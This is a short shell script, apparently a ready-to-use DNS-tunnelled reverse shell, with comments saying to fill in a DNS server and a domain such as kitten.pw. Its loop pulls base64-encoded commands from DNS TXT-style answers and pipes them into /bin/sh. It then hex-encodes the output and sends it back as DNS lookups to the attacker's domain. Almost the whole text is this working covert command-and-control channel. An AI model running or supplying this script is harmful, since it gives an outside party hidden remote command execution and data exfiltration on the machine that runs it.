# In the below, SERVER and DOMAIN need to be replaced with the appropriate server and domain.
#
# :s/SERVER/8.8.8.8/g
# :s/DOMAIN/kitten.pw/g


while :; do dig @SERVER $RANDOM.DOMAIN +short | perl -ne 'chomp;map{print chr}split/\./' | base64 -d; sleep .2; done | /bin/sh | perl -e '$|=1;$/=\2;while(<>){$a=join"",map{sprintf"%02x",ord}split//;`dig \@SERVER $a.\$RANDOM.o.DOMAIN`}'
